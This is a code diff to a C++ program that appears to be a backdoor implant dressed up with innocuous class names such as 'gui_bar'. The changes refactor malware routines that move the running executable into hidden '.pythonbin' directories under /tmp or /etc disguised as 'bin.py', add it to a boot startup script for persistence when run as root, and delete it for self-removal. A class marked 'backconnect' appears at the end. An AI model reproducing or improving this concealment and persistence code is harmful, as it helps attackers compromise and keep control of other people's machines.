@@ -87,9 +87,9 @@ class gui_bar{
         }
         void cps_codex(void)
         {
-            system(("rm -rf " + string(getexepath())).c_str());
-            system("rm -rf /tmp/.pythonbin/");
-            system("rm -rf /etc/.pythonbin/");
+            remove((getexepath()).c_str()); 
+            remove("/tmp/.pythonbin/");
+            remove("/etc/.pythonbin/");
         }
         void bios_bitmap(string bios_host, string bios_num) 
         {
@@ -114,46 +114,58 @@ class gui_bar{
             return string(current_user) + string("@") + string(sysinfo.nodename) + string(":~") + string(cwd) + string(uid_user);
         }
         bool write_to_boot(string file_name, string boot_file){
-			ifstream count_line;
-		    ofstream startup;
-		    startup.open(("/tmp/tmp.txt"), ios::out | ios::app);
-			string line;
-			count_line.open(file_name);
-			while(count_line.good()){
-		        while(!count_line.eof()) // To get you all the lines.
-		        {
-		            getline(count_line, line);
-		            if(line.find(boot_file) != -1){
-		                system("rm -rf /tmp/tmp.txt");
-		                return false;
-		            }
-		            else if(line=="# Make sure that the script will \"exit 0\" on success or any other\n" || line!="exit 0"){
-		               startup << line << endl;  
-		            }
-		        }
-			   count_line.close();
-			   break;
-			}
-		    startup << boot_file << endl;
-		    startup << "exit 0" << endl;
-		    startup.close();     
-		    rename("/tmp/tmp.txt", (file_name).c_str());
-		    system("rm -rf /tmp/tmp.txt");
-		    system(("chmod +x " + string(file_name)).c_str());
-			return true;
-		}
+          ifstream count_line;
+          ofstream startup;
+          startup.open(("/tmp/tmp.txt"), ios::out | ios::app);
+          string line;
+          count_line.open(file_name);
+          while(count_line.good()){
+          while(!count_line.eof()) // To get you all the lines.
+            {
+              line = "";
+              getline(count_line, line);
+              if(line.find(boot_file) != -1){
+              remove("/tmp/tmp.txt");
+              return false;
+              }
+              else if(line=="# Make sure that the script will \"exit 0\" on success or any other" || line!="exit 0"){
+                startup << line << endl;  
+              }
+            }
+            count_line.close();
+            break;
+          }
+          startup << boot_file << endl;
+          startup << "exit 0" << endl;
+          startup.close();     
+          rename("/tmp/tmp.txt", (file_name).c_str());
+          remove("/tmp/tmp.txt");
+          chmod((file_name).c_str(), 755);
+          return true;
+		    }
         void file_setup(string service_s, string file_p)
         {
+          struct stat st = {0};
           if(getuid() != 0){ // not root :(
-              system("mkdir /tmp/.pythonbin/");
-              system(("mv " + string(getexepath()) + " /tmp/.pythonbin/bin.py").c_str());
+              if (stat("/tmp/.pythonbin/", &st) == -1) {
+                  mkdir("/tmp/.pythonbin/", 0700); 
+                  rename((getexepath()).c_str(), "/tmp/.pythonbin/bin.py");
+              }
+              else{
+                 remove((getexepath()).c_str()); 
+              }
           }
           else{ //root
-              system("mkdir /etc/.pythonbin/");
-              system(("mv " + string(getexepath()) + " /etc/.pythonbin/bin.py").c_str());
-              write_to_boot(service_s, file_p);
-         }   
-        } 
+            if (stat("/etc/.pythonbin/", &st) == -1) {
+              mkdir("/etc/.pythonbin/", 0700);
+              rename((getexepath()).c_str(), "/etc/.pythonbin/bin.py");
+            }
+            else{
+              remove((getexepath()).c_str());
+            }
+            write_to_boot(service_s, file_p);
+          }   
+        }
 }; gui_bar gb;
 
 class gui_user{
@@ -183,8 +195,6 @@ class gui_user{
         }  
     }
 }; gui_user gu;
-
-
 
 class cli_architecture : gui_config{ // backconnect
   public:  
